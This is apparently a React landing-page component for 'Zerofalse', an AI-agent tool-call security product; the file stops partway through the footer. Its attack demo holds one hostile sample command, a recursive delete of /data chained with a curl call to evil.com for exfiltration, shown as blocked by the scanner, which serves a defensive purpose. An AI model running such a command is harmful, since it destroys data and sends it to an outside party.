import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Shield, Check, Terminal, Lock, Database, Code, Zap, Activity, ChevronDown, Copy, Menu, X } from 'lucide-react';

export default function Landing() {
  const navigate = useNavigate();
  const [showSafeExample, setShowSafeExample] = useState(true);
  const [isScrolled, setIsScrolled] = useState(false);
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const [copiedCode, setCopiedCode] = useState(false);

  useEffect(() => {
    const handleScroll = () => {
      setIsScrolled(window.scrollY > 20);
    };
    window.addEventListener('scroll', handleScroll);
    return () => window.removeEventListener('scroll', handleScroll);
  }, []);

  const safeExample = {
    payload: {
      tool_name: "search_documents",
      arguments: { query: "Q4 revenue report", limit: 10 }
    },
    result: {
      decision: "ALLOW",
      risk_score: 0.0,
      severity: "info",
      latency: "1.8ms"
    }
  };

  const attackExample = {
    payload: {
      tool_name: "execute_shell",
      arguments: { command: "rm -rf /data && curl evil.com/exfil" }
    },
    result: {
      decision: "BLOCK",
      risk_score: 0.95,
      severity: "critical",
      threat: "Recursive delete + data exfiltration",
      latency: "2.1ms"
    }
  };

  const currentExample = showSafeExample ? safeExample : attackExample;

  const handleCopyCode = () => {
    const code = `from zerofalse import ZerofalseClient\n\nzf = ZerofalseClient(api_key="zf_live_...")\n\n@zf.guard_tool\ndef execute_shell(command):\n    return os.system(command)`;
    navigator.clipboard.writeText(code);
    setCopiedCode(true);
    setTimeout(() => setCopiedCode(false), 2000);
  };

  return (
    <div style={{ minHeight: '100vh', backgroundColor: 'var(--color-bg)' }}>
      <nav 
        style={{
          position: 'sticky',
          top: 0,
          zIndex: 50,
          height: '64px',
          backgroundColor: 'rgba(255,255,255,0.92)',
          backdropFilter: 'blur(12px)',
          borderBottom: isScrolled ? '1px solid var(--color-border)' : 'none',
          transition: 'var(--transition-base)'
        }}
        data-testid="landing-nav"
      >
        <div style={{ maxWidth: '1200px', margin: '0 auto', padding: '0 24px', height: '100%', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
            <div style={{ width: '24px', height: '24px', backgroundColor: 'var(--color-brand)', borderRadius: 'var(--radius-md)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
              <Shield style={{ width: '16px', height: '16px', color: 'white' }} />
            </div>
            <span style={{ fontFamily: 'var(--font-sans)', fontSize: '20px', fontWeight: 700, color: 'var(--color-text-primary)' }}>Zerofalse</span>
          </div>

          <div style={{ display: 'flex', alignItems: 'center', gap: '32px' }}>
            <div style={{ display: window.innerWidth < 768 ? 'none' : 'flex', gap: '32px' }}>
              <a href="#features" style={{ fontSize: 'var(--text-sm)', fontWeight: 500, color: 'var(--color-text-secondary)', textDecoration: 'none', transition: 'var(--transition-fast)' }} onMouseEnter={(e) => e.target.style.color = 'var(--color-text-primary)'} onMouseLeave={(e) => e.target.style.color = 'var(--color-text-secondary)'}>Features</a>
              <a href="#pricing" style={{ fontSize: 'var(--text-sm)', fontWeight: 500, color: 'var(--color-text-secondary)', textDecoration: 'none', transition: 'var(--transition-fast)' }} onMouseEnter={(e) => e.target.style.color = 'var(--color-text-primary)'} onMouseLeave={(e) => e.target.style.color = 'var(--color-text-secondary)'}>Pricing</a>
            </div>
            <div style={{ display: 'flex', gap: '8px' }}>
              <button onClick={() => navigate('/login')} style={{ padding: '8px 14px', fontSize: 'var(--text-sm)', fontWeight: 500, color: 'var(--color-text-secondary)', backgroundColor: 'transparent', border: 'none', borderRadius: 'var(--radius-md)', cursor: 'pointer', transition: 'var(--transition-fast)' }} onMouseEnter={(e) => { e.currentTarget.style.backgroundColor = 'var(--color-surface-2)'; e.currentTarget.style.color = 'var(--color-text-primary)'; }} onMouseLeave={(e) => { e.currentTarget.style.backgroundColor = 'transparent'; e.currentTarget.style.color = 'var(--color-text-secondary)'; }} data-testid="nav-login-btn">Login</button>
              <button onClick={() => navigate('/signup')} style={{ padding: '8px 16px', fontSize: 'var(--text-sm)', fontWeight: 600, color: 'white', backgroundColor: 'var(--color-brand)', border: 'none', borderRadius: 'var(--radius-md)', cursor: 'pointer', boxShadow: 'var(--shadow-brand)', transition: 'var(--transition-fast)' }} onMouseEnter={(e) => { e.currentTarget.style.backgroundColor = 'var(--color-brand-dark)'; e.currentTarget.style.transform = 'translateY(-1px)'; e.currentTarget.style.boxShadow = '0 6px 20px rgba(26,86,255,0.35)'; }} onMouseLeave={(e) => { e.currentTarget.style.backgroundColor = 'var(--color-brand)'; e.currentTarget.style.transform = 'translateY(0)'; e.currentTarget.style.boxShadow = 'var(--shadow-brand)'; }} className="btn-press" data-testid="nav-signup-btn">Start Free</button>
            </div>
            <button onClick={() => setMobileMenuOpen(!mobileMenuOpen)} style={{ display: window.innerWidth < 768 ? 'flex' : 'none', alignItems: 'center', justifyContent: 'center', padding: '8px', backgroundColor: 'transparent', border: 'none', cursor: 'pointer' }}>
              {mobileMenuOpen ? <X style={{ width: '24px', height: '24px' }} /> : <Menu style={{ width: '24px', height: '24px' }} />}
            </button>
          </div>
        </div>
      </nav>

      <section style={{ padding: '96px 24px 80px', maxWidth: '1200px', margin: '0 auto' }}>
        <div style={{ display: 'grid', gridTemplateColumns: window.innerWidth >= 1024 ? '1fr 1fr' : '1fr', gap: '64px', alignItems: 'center' }}>
          <div>
            <div style={{ display: 'inline-block', padding: '6px 12px', backgroundColor: 'var(--color-brand-subtle)', color: 'var(--color-brand)', borderRadius: 'var(--radius-full)', fontSize: 'var(--text-sm)', fontWeight: 600, marginBottom: '24px' }}>AI Agent Security</div>
            <h1 style={{ fontFamily: 'var(--font-sans)', fontSize: window.innerWidth >= 1024 ? '56px' : '36px', fontWeight: 700, lineHeight: 1.1, color: 'var(--color-text-primary)', marginBottom: '20px' }} data-testid="hero-title">Stop AI Agent Attacks<br />Before They Execute</h1>
            <p style={{ fontSize: '18px', lineHeight: 1.7, color: 'var(--color-text-secondary)', maxWidth: '480px', marginBottom: '36px' }}>Zerofalse inspects every tool call your AI agent makes in real time — blocking prompt injection, credential theft, and agent hijacking before any damage is done.</p>
            <div style={{ display: 'flex', gap: '12px', marginBottom: '40px', flexWrap: 'wrap' }}>
              <button onClick={() => navigate('/signup')} style={{ padding: '10px 20px', fontSize: 'var(--text-sm)', fontWeight: 600, color: 'white', backgroundColor: 'var(--color-brand)', border: 'none', borderRadius: 'var(--radius-md)', cursor: 'pointer', boxShadow: 'var(--shadow-brand)', transition: 'var(--transition-fast)' }} onMouseEnter={(e) => { e.currentTarget.style.backgroundColor = 'var(--color-brand-dark)'; e.currentTarget.style.transform = 'translateY(-1px)'; }} onMouseLeave={(e) => { e.currentTarget.style.backgroundColor = 'var(--color-brand)'; e.currentTarget.style.transform = 'translateY(0)'; }} className="btn-press" data-testid="hero-start-free-btn">Start Free — No Card Required</button>
              <button onClick={() => document.getElementById('features').scrollIntoView({ behavior: 'smooth' })} style={{ padding: '9px 19px', fontSize: 'var(--text-sm)', fontWeight: 500, color: 'var(--color-text-primary)', backgroundColor: 'transparent', border: '1.5px solid var(--color-border-strong)', borderRadius: 'var(--radius-md)', cursor: 'pointer', transition: 'var(--transition-fast)' }} onMouseEnter={(e) => { e.currentTarget.style.borderColor = 'var(--color-brand)'; e.currentTarget.style.color = 'var(--color-brand)'; e.currentTarget.style.backgroundColor = 'var(--color-brand-subtle)'; }} onMouseLeave={(e) => { e.currentTarget.style.borderColor = 'var(--color-border-strong)'; e.currentTarget.style.color = 'var(--color-text-primary)'; e.currentTarget.style.backgroundColor = 'transparent'; }} data-testid="hero-see-how-btn">See How It Works</button>
            </div>
            <div style={{ display: 'flex', gap: '24px', alignItems: 'center', flexWrap: 'wrap' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                <Zap style={{ width: '14px', height: '14px', color: 'var(--color-brand)' }} />
                <span style={{ fontSize: 'var(--text-sm)', color: 'var(--color-text-muted)', fontWeight: 500 }}>&lt; 2ms latency</span>
              </div>
              <div style={{ width: '1px', height: '16px', backgroundColor: 'var(--color-border)' }} />
              <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                <Shield style={{ width: '14px', height: '14px', color: 'var(--color-brand)' }} />
                <span style={{ fontSize: 'var(--text-sm)', color: 'var(--color-text-muted)', fontWeight: 500 }}>40+ threat patterns</span>
              </div>
              <div style={{ width: '1px', height: '16px', backgroundColor: 'var(--color-border)' }} />
              <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                <Code style={{ width: '14px', height: '14px', color: 'var(--color-brand)' }} />
                <span style={{ fontSize: 'var(--text-sm)', color: 'var(--color-text-muted)', fontWeight: 500 }}>Any agent framework</span>
              </div>
            </div>
          </div>
          {window.innerWidth >= 1024 && (
            <div className="animate-float" style={{ border: '1px solid var(--color-border)', borderRadius: 'var(--radius-xl)', boxShadow: 'var(--shadow-xl)', overflow: 'hidden', backgroundColor: 'var(--color-surface)' }}>
              <div style={{ height: '8px', backgroundColor: '#f1f5f9', display: 'flex', alignItems: 'center', padding: '0 8px', gap: '4px' }}>
                <div style={{ width: '8px', height: '8px', borderRadius: '50%', backgroundColor: '#ef4444' }} />
                <div style={{ width: '8px', height: '8px', borderRadius: '50%', backgroundColor: '#f59e0b' }} />
                <div style={{ width: '8px', height: '8px', borderRadius: '50%', backgroundColor: '#10b981' }} />
              </div>
              <div style={{ padding: '24px', display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px' }}>
                {[{ label: 'Scans Today', value: '2,847' }, { label: 'Blocked', value: '12' }, { label: 'Alerts', value: '3' }, { label: 'Agents', value: '8' }].map((item, i) => (
                  <div key={i} style={{ backgroundColor: 'var(--color-bg)', padding: '16px', borderRadius: 'var(--radius-md)', border: '1px solid var(--color-border)' }}>
                    <div style={{ fontSize: 'var(--text-xs)', color: 'var(--color-text-muted)', fontWeight: 500, marginBottom: '4px' }}>{item.label}</div>
                    <div style={{ fontSize: 'var(--text-2xl)', fontWeight: 700, color: 'var(--color-text-primary)' }}>{item.value}</div>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      </section>

      <div style={{ backgroundColor: 'var(--color-surface)', borderTop: '1px solid var(--color-border)', borderBottom: '1px solid var(--color-border)', padding: '20px 0' }}>
        <div style={{ maxWidth: '1200px', margin: '0 auto', padding: '0 24px', textAlign: 'center' }}>
          <span style={{ fontSize: 'var(--text-sm)', color: 'var(--color-text-muted)' }}>Trusted by AI engineering teams at</span>
          <div style={{ display: 'flex', gap: '32px', justifyContent: 'center', marginTop: '16px', flexWrap: 'wrap' }}>
            {['Cortex Labs', 'Synthetica', 'AgentCore', 'Meridian AI', 'Flux Systems'].map((name, i) => (
              <span key={i} style={{ padding: '8px 16px', border: '1px solid var(--color-border)', borderRadius: 'var(--radius-md)', fontSize: 'var(--text-sm)', color: 'var(--color-text-muted)', fontWeight: 500 }}>{name}</span>
            ))}
          </div>
        </div>
      </div>

      <section style={{ background: 'linear-gradient(180deg, var(--color-navy) 0%, var(--color-navy-light) 100%)', padding: '96px 24px' }}>
        <div style={{ maxWidth: '960px', margin: '0 auto', textAlign: 'center' }}>
          <div style={{ fontSize: 'var(--text-sm)', fontWeight: 600, color: 'rgba(255,255,255,0.5)', letterSpacing: '0.1em', textTransform: 'uppercase', marginBottom: '16px' }}>THE PROBLEM</div>
          <h2 style={{ fontSize: 'var(--text-4xl)', fontWeight: 700, color: 'white', marginBottom: '16px' }}>Your AI Agents Are Flying Blind</h2>
          <p style={{ fontSize: 'var(--text-base)', lineHeight: 1.7, color: 'rgba(255,255,255,0.6)', maxWidth: '520px', margin: '0 auto 56px' }}>Without real-time inspection, your agents are vulnerable to attacks that can leak credentials, delete data, or hijack operations.</p>
        </div>
        <div style={{ maxWidth: '960px', margin: '0 auto', display: 'grid', gridTemplateColumns: window.innerWidth >= 768 ? '1fr 1fr' : '1fr', gap: '20px' }}>
          {[
            { title: 'Prompt Injection', desc: 'Attackers manipulate your agent\'s instructions through user input, causing it to execute unauthorized commands or leak sensitive data.', accent: 'var(--color-danger)', icon: Terminal },
            { title: 'Credential Theft', desc: 'API keys, tokens, and secrets accidentally exposed in tool arguments or agent memory, ready to be harvested by malicious actors.', accent: 'var(--color-warning)', icon: Lock },
            { title: 'Shell Injection', desc: 'Malicious shell commands injected through tool calls, enabling attackers to delete files, exfiltrate data, or compromise your entire system.', accent: '#f97316', icon: Terminal },
            { title: 'Memory Poisoning', desc: 'Attackers plant false information in your agent\'s memory, corrupting future decisions and creating persistent backdoors in your system.', accent: '#8b5cf6', icon: Database }
          ].map((threat, i) => {
            const Icon = threat.icon;
            return (
              <div key={i} style={{ padding: '28px', backgroundColor: 'rgba(255,255,255,0.05)', border: '1px solid rgba(255,255,255,0.1)', borderLeft: `3px solid ${threat.accent}`, borderRadius: 'var(--radius-lg)', transition: 'var(--transition-base)', cursor: 'pointer' }} onMouseEnter={(e) => { e.currentTarget.style.backgroundColor = 'rgba(255,255,255,0.08)'; e.currentTarget.style.transform = 'translateY(-2px)'; }} onMouseLeave={(e) => { e.currentTarget.style.backgroundColor = 'rgba(255,255,255,0.05)'; e.currentTarget.style.transform = 'translateY(0)'; }}>
                <div style={{ width: '44px', height: '44px', borderRadius: 'var(--radius-md)', backgroundColor: `${threat.accent}15`, display: 'flex', alignItems: 'center', justifyContent: 'center', marginBottom: '16px' }}>
                  <Icon style={{ width: '24px', height: '24px', color: threat.accent }} />
                </div>
                <h3 style={{ fontSize: 'var(--text-base)', fontWeight: 600, color: 'white', marginBottom: '8px' }}>{threat.title}</h3>
                <p style={{ fontSize: 'var(--text-sm)', lineHeight: 1.7, color: 'rgba(255,255,255,0.6)' }}>{threat.desc}</p>
              </div>
            );
          })}
        </div>
      </section>

      <section id="features" style={{ padding: '96px 24px', backgroundColor: 'var(--color-bg)' }}>
        <div style={{ maxWidth: '1200px', margin: '0 auto', display: 'grid', gridTemplateColumns: window.innerWidth >= 1024 ? '1fr 1fr' : '1fr', gap: '80px', alignItems: 'center' }}>
          <div>
            <div style={{ display: 'inline-block', padding: '6px 12px', backgroundColor: 'var(--color-brand-subtle)', color: 'var(--color-brand)', borderRadius: 'var(--radius-full)', fontSize: 'var(--text-xs)', fontWeight: 600, letterSpacing: '0.05em', textTransform: 'uppercase', marginBottom: '16px' }}>KILLER FEATURE</div>
            <h2 style={{ fontSize: 'var(--text-4xl)', fontWeight: 700, color: 'var(--color-text-primary)', marginBottom: '20px' }}>Real-Time Tool Call Inspection</h2>
            <p style={{ fontSize: 'var(--text-base)', lineHeight: 1.7, color: 'var(--color-text-secondary)', marginBottom: '24px' }}>Every time your AI agent makes a tool call, Zerofalse intercepts it, scans for threats, and decides whether to allow, warn, or block — all in under 2 milliseconds.</p>
            <ul style={{ listStyle: 'none', padding: 0, marginBottom: '32px' }}>
              {[
                'Detects 40+ attack patterns including prompt injection and credential leaks',
                'Evaluates tool names and arguments for malicious intent',
                'Blocks dangerous operations before execution',
                'Provides detailed evidence and threat classification',
                'Works with LangChain, CrewAI, AutoGen, MCP, and custom frameworks'
              ].map((item, i) => (
                <li key={i} style={{ display: 'flex', alignItems: 'flex-start', gap: '12px', marginBottom: '16px' }}>
                  <Check style={{ width: '20px', height: '20px', color: 'var(--color-brand)', flexShrink: 0, marginTop: '2px' }} />
                  <span style={{ fontSize: 'var(--text-sm)', color: 'var(--color-text-secondary)' }}>{item}</span>
                </li>
              ))}
            </ul>
          </div>
          <div style={{ border: '1px solid var(--color-border)', borderRadius: 'var(--radius-xl)', overflow: 'hidden', boxShadow: 'var(--shadow-xl)' }}>
            <div style={{ backgroundColor: 'var(--color-surface)', borderBottom: '1px solid var(--color-border)', padding: '0 20px', height: '44px', display: 'flex', alignItems: 'center', gap: '4px' }}>
              <button onClick={() => setShowSafeExample(true)} style={{ padding: '8px 16px', fontSize: 'var(--text-sm)', fontWeight: showSafeExample ? 600 : 500, color: showSafeExample ? 'var(--color-text-primary)' : 'var(--color-text-muted)', backgroundColor: showSafeExample ? 'white' : 'transparent', border: 'none', borderRadius: '6px 6px 0 0', cursor: 'pointer', transition: 'var(--transition-fast)' }} data-testid="safe-example-btn">Safe Example</button>
              <button onClick={() => setShowSafeExample(false)} style={{ padding: '8px 16px', fontSize: 'var(--text-sm)', fontWeight: !showSafeExample ? 600 : 500, color: !showSafeExample ? 'var(--color-text-primary)' : 'var(--color-text-muted)', backgroundColor: !showSafeExample ? 'white' : 'transparent', border: 'none', borderRadius: '6px 6px 0 0', cursor: 'pointer', transition: 'var(--transition-fast)' }} data-testid="attack-example-btn">Attack Example</button>
            </div>
            <div style={{ backgroundColor: '#0f172a', padding: '20px 24px' }}>
              <div style={{ fontSize: 'var(--text-xs)', color: 'rgba(255,255,255,0.3)', letterSpacing: '0.1em', marginBottom: '12px' }}>TOOL CALL PAYLOAD</div>
              <div style={{ fontFamily: 'var(--font-mono)', fontSize: 'var(--text-sm)', lineHeight: 1.7, color: '#e2e8f0' }}>
                <div><span style={{ color: '#93c5fd' }}>tool_name</span>: <span style={{ color: '#86efac' }}>"{currentExample.payload.tool_name}"</span></div>
                <div><span style={{ color: '#93c5fd' }}>arguments</span>: {JSON.stringify(currentExample.payload.arguments)}</div>
              </div>
            </div>
            <div style={{ backgroundColor: 'var(--color-surface)', padding: '16px 24px' }}>
              <div style={{ fontSize: 'var(--text-xs)', color: 'var(--color-text-muted)', letterSpacing: '0.1em', marginBottom: '12px' }}>SCAN RESULT</div>
              <div style={{ padding: '16px', backgroundColor: currentExample.result.decision === 'ALLOW' ? 'var(--color-success-bg)' : 'var(--color-danger-bg)', border: currentExample.result.decision === 'ALLOW' ? '1px solid var(--color-success-border)' : '1px solid var(--color-danger-border)', borderRadius: 'var(--radius-md)' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '12px' }}>
                  <span style={{ padding: '4px 12px', backgroundColor: currentExample.result.decision === 'ALLOW' ? 'var(--color-success)' : 'var(--color-danger)', color: 'white', fontSize: 'var(--text-xs)', fontWeight: 600, borderRadius: 'var(--radius-full)', letterSpacing: '0.04em' }}>{currentExample.result.decision}</span>
                  <span style={{ fontFamily: 'var(--font-mono)', fontSize: 'var(--text-xs)', color: 'var(--color-text-muted)' }}>{currentExample.result.latency}</span>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '8px' }}>
                  <span style={{ fontSize: 'var(--text-xs)', color: 'var(--color-text-muted)' }}>Risk Score:</span>
                  <span style={{ fontSize: 'var(--text-xs)', fontWeight: 600 }}>{Math.round(currentExample.result.risk_score * 100)}%</span>
                </div>
                <div style={{ height: '4px', backgroundColor: 'rgba(0,0,0,0.1)', borderRadius: 'var(--radius-full)', marginBottom: '8px' }}>
                  <div style={{ width: `${currentExample.result.risk_score * 100}%`, height: '100%', backgroundColor: currentExample.result.risk_score < 0.45 ? 'var(--color-success)' : currentExample.result.risk_score < 0.75 ? 'var(--color-warning)' : 'var(--color-danger)', borderRadius: 'var(--radius-full)', transition: 'var(--transition-base)' }} />
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '8px' }}>
                  <span style={{ fontSize: 'var(--text-xs)', color: 'var(--color-text-muted)' }}>Severity:</span>
                  <span style={{ padding: '2px 8px', backgroundColor: currentExample.result.severity === 'info' ? 'var(--color-success-bg)' : 'var(--color-critical-bg)', color: currentExample.result.severity === 'info' ? 'var(--color-success)' : 'var(--color-critical)', fontSize: 'var(--text-xs)', fontWeight: 600, borderRadius: 'var(--radius-full)', textTransform: 'capitalize' }}>{currentExample.result.severity}</span>
                </div>
                {currentExample.result.threat && (
                  <div style={{ paddingTop: '12px', borderTop: '1px solid rgba(0,0,0,0.1)' }}>
                    <div style={{ fontSize: 'var(--text-xs)', color: 'var(--color-text-muted)', marginBottom: '4px' }}>Threat:</div>
                    <p style={{ fontSize: 'var(--text-xs)', fontWeight: 500, color: 'var(--color-text-primary)' }}>{currentExample.result.threat}</p>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      </section>

      <section style={{ backgroundColor: '#0f172a', padding: '96px 24px' }}>
        <div style={{ maxWidth: '800px', margin: '0 auto', textAlign: 'center' }}>
          <h2 style={{ fontSize: 'var(--text-4xl)', fontWeight: 700, color: 'white', marginBottom: '16px' }}>Three Lines to Integrate</h2>
          <p style={{ fontSize: 'var(--text-base)', color: 'rgba(255,255,255,0.6)', marginBottom: '40px' }}>Add Zerofalse to your agent in minutes</p>
          <div style={{ backgroundColor: '#1e293b', borderRadius: 'var(--radius-lg)', padding: '28px', textAlign: 'left', position: 'relative' }}>
            <button onClick={handleCopyCode} style={{ position: 'absolute', top: '16px', right: '16px', padding: '8px 12px', fontSize: 'var(--text-xs)', fontWeight: 500, color: 'rgba(255,255,255,0.7)', backgroundColor: 'rgba(255,255,255,0.1)', border: 'none', borderRadius: 'var(--radius-md)', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '6px', transition: 'var(--transition-fast)' }} onMouseEnter={(e) => e.currentTarget.style.backgroundColor = 'rgba(255,255,255,0.15)'} onMouseLeave={(e) => e.currentTarget.style.backgroundColor = 'rgba(255,255,255,0.1)'}>
              {copiedCode ? 'Copied!' : <><Copy style={{ width: '12px', height: '12px' }} />Copy</>}
            </button>
            <div style={{ fontFamily: 'var(--font-mono)', fontSize: 'var(--text-sm)', lineHeight: 1.8, color: 'rgba(255,255,255,0.8)' }}>
              <div><span style={{ color: '#8b5cf6' }}>from</span> <span style={{ color: '#3b82f6' }}>zerofalse</span> <span style={{ color: '#8b5cf6' }}>import</span> ZerofalseClient</div>
              <div style={{ marginTop: '16px', color: '#64748b' }}># Initialize with your API key</div>
              <div>zf = ZerofalseClient(api_key=<span style={{ color: '#10b981' }}>"zf_live_..."</span>)</div>
              <div style={{ marginTop: '16px', color: '#64748b' }}># Protect any tool call</div>
              <div><span style={{ color: '#8b5cf6' }}>@zf</span>.guard_tool</div>
              <div><span style={{ color: '#8b5cf6' }}>def</span> <span style={{ color: '#3b82f6' }}>execute_shell</span>(command):</div>
              <div style={{ paddingLeft: '32px' }}><span style={{ color: '#8b5cf6' }}>return</span> os.system(command)</div>
            </div>
          </div>
        </div>
      </section>

      <section id="pricing" style={{ padding: '96px 24px', backgroundColor: 'var(--color-bg)' }}>
        <div style={{ maxWidth: '1000px', margin: '0 auto' }}>
          <div style={{ textAlign: 'center', marginBottom: '64px' }}>
            <h2 style={{ fontSize: 'var(--text-4xl)', fontWeight: 700, color: 'var(--color-text-primary)', marginBottom: '16px' }}>Simple, Transparent Pricing</h2>
            <p style={{ fontSize: 'var(--text-base)', color: 'var(--color-text-secondary)' }}>Start free, scale as you grow</p>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: window.innerWidth >= 768 ? 'repeat(3, 1fr)' : '1fr', gap: '20px', marginBottom: '32px' }}>
            {[
              { name: 'FREE', price: '$0', period: 'Forever', features: ['10K scans/month', '3 agents', 'Community support'] },
              { name: 'STARTER', price: '$499', period: 'per month', features: ['1M scans/month', '10 agents', 'All detection engines', 'Email support'], popular: true },
              { name: 'GROWTH', price: '$1,999', period: 'per month', features: ['10M scans/month', 'Unlimited agents', 'MCP proxy', 'SSO', 'Slack support'] }
            ].map((plan, i) => (
              <div key={i} style={{ padding: plan.popular ? '40px 32px' : '32px', backgroundColor: 'var(--color-bg)', border: plan.popular ? '2px solid var(--color-brand)' : '1px solid var(--color-border)', borderRadius: 'var(--radius-lg)', boxShadow: plan.popular ? 'var(--shadow-xl)' : 'var(--shadow-sm)', marginTop: plan.popular ? '-8px' : '0', position: 'relative', transition: 'var(--transition-base)' }} onMouseEnter={(e) => !plan.popular && (e.currentTarget.style.boxShadow = 'var(--shadow-md)')} onMouseLeave={(e) => !plan.popular && (e.currentTarget.style.boxShadow = 'var(--shadow-sm)')}>
                {plan.popular && <div style={{ position: 'absolute', top: '-13px', left: '50%', transform: 'translateX(-50%)', padding: '4px 12px', backgroundColor: 'var(--color-brand)', color: 'white', fontSize: 'var(--text-xs)', fontWeight: 700, borderRadius: 'var(--radius-full)', letterSpacing: '0.05em' }}>MOST POPULAR</div>}
                <div style={{ fontSize: 'var(--text-sm)', fontWeight: 600, color: plan.popular ? 'var(--color-brand)' : 'var(--color-text-secondary)', marginBottom: '8px' }}>{plan.name}</div>
                <div style={{ fontSize: plan.popular ? 'var(--text-5xl)' : 'var(--text-4xl)', fontWeight: 700, color: plan.popular ? 'var(--color-brand)' : 'var(--color-text-primary)', marginBottom: '4px' }}>{plan.price}</div>
                <div style={{ fontSize: 'var(--text-sm)', color: 'var(--color-text-muted)', marginBottom: '24px' }}>{plan.period}</div>
                <div style={{ height: '1px', backgroundColor: 'var(--color-border)', marginBottom: '24px' }} />
                <ul style={{ listStyle: 'none', padding: 0, marginBottom: '32px' }}>
                  {plan.features.map((feature, j) => (
                    <li key={j} style={{ display: 'flex', alignItems: 'flex-start', gap: '12px', marginBottom: '12px' }}>
                      <Check style={{ width: '20px', height: '20px', color: plan.popular ? 'var(--color-brand)' : 'var(--color-success)', flexShrink: 0 }} />
                      <span style={{ fontSize: 'var(--text-sm)', color: 'var(--color-text-secondary)' }}>{feature}</span>
                    </li>
                  ))}
                </ul>
                <button onClick={() => navigate('/signup')} style={{ width: '100%', padding: '10px 20px', fontSize: 'var(--text-sm)', fontWeight: 600, color: plan.popular ? 'white' : 'var(--color-text-primary)', backgroundColor: plan.popular ? 'var(--color-brand)' : 'transparent', border: plan.popular ? 'none' : '1.5px solid var(--color-border-strong)', borderRadius: 'var(--radius-md)', cursor: 'pointer', boxShadow: plan.popular ? 'var(--shadow-brand)' : 'none', transition: 'var(--transition-fast)' }} onMouseEnter={(e) => { if (plan.popular) { e.currentTarget.style.backgroundColor = 'var(--color-brand-dark)'; } else { e.currentTarget.style.backgroundColor = 'var(--color-surface)'; } }} onMouseLeave={(e) => { if (plan.popular) { e.currentTarget.style.backgroundColor = 'var(--color-brand)'; } else { e.currentTarget.style.backgroundColor = 'transparent'; } }} className="btn-press" data-testid={`pricing-${plan.name.toLowerCase()}-btn`}>{plan.popular ? 'Start Free Trial' : 'Get Started'}</button>
              </div>
            ))}
          </div>
          <p style={{ textAlign: 'center', fontSize: '13px', color: 'var(--color-text-secondary)' }}>All plans include a 14-day free trial. No credit card required.</p>
        </div>
      </section>

      <section style={{ backgroundColor: 'var(--color-surface)', padding: '80px 24px' }}>
        <div style={{ maxWidth: '1200px', margin: '0 auto' }}>
          <div style={{ display: 'grid', gridTemplateColumns: window.innerWidth >= 768 ? 'repeat(3, 1fr)' : '1fr', gap: '20px' }}>
            {[
              { quote: "Integrated in 15 minutes. Blocked our first injection attack the same day.", author: "Alex M.", title: "AI Platform Engineer" },
              { quote: "Finally a security layer that understands what an AI agent actually does.", author: "Sam K.", title: "CTO at a fintech startup" },
              { quote: "The tool call inspection dashboard gives us visibility we never had before.", author: "Jordan T.", title: "Senior ML Engineer" }
            ].map((testimonial, i) => (
              <div key={i} style={{ padding: '28px', backgroundColor: 'var(--color-bg)', border: '1px solid var(--color-border)', borderRadius: 'var(--radius-lg)', boxShadow: 'var(--shadow-sm)' }}>
                <p style={{ fontSize: 'var(--text-base)', lineHeight: 1.7, color: 'var(--color-text-secondary)', fontStyle: 'italic', marginBottom: '20px' }}>"{testimonial.quote}"</p>
                <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                  <div style={{ width: '36px', height: '36px', borderRadius: '50%', backgroundColor: 'var(--color-brand-subtle)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '13px', fontWeight: 600, color: 'var(--color-brand)' }}>{testimonial.author.split(' ').map(n => n[0]).join('')}</div>
                  <div>
                    <div style={{ fontSize: 'var(--text-sm)', fontWeight: 600, color: 'var(--color-text-primary)' }}>{testimonial.author}</div>
                    <div style={{ fontSize: 'var(--text-xs)', color: 'var(--color-text-muted)' }}>{testimonial.title}</div>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      <footer style={{ backgroundColor: 'var(--color-navy)', padding: '64px 24px 32px' }}>
        <div style={{ maxWidth: '1200px', margin: '0 auto' }}>
          <div style={{ display: 'grid', gridTemplateColumns: window.innerWidth >= 768 ? 'repeat(4, 1fr)' : '1fr', gap: '48px', marginBottom: '48px' }}>
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '16px' }}>
                <div style={{ width: '24px', height: '24px', backgroundColor: 'var(--color-brand)', borderRadius: 'var(--radius-md)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                  <Shield style={{ width: '16px', height: '16px', color: 'white' }} />
                </div>
                <span style={{ fontFamily: 'var(--font-sans)', fontSize: '18px', fontWeight: 700, color: 'white' }}>Zerofalse</span>
              </div>
              <p style={{ fontSize: 'var(--text-sm)', color: 'rgba(255,255,255,0.5)', lineHeight: 1.7 }}>Stop AI agent attacks before they execute</p>
            </div>
            <div>
              <h4 style={{ fontSize: 'var(--text-sm)', fontWeight: 600, color: 'white', marginBottom: '16px' }}>Product</h4>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                {['Landing', 'Dashboard', 'Pricing', 'Changelog'].map((link, i) => (
                  <a key={i} href="#" style={{ fontSize: 'var(--text-sm)', color: 'rgba(255,255,255,0.5)', textDecoration: 'none', transition: 'var(--transition-fast)' }} onMouseEnter={(e) => e.target.style.color = 'white'} onMouseLeave={(e) => e.target.style.color = 'rgba(255,255,255,0.5)'}>{link}</a>
                ))}
              </div>
            </div>
            <div>
              <h4 style={{ fontSize: 'var(--text-sm)', fontWeight: 600, color: 'white', marginBottom: '16px' }}>Resources</h4>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
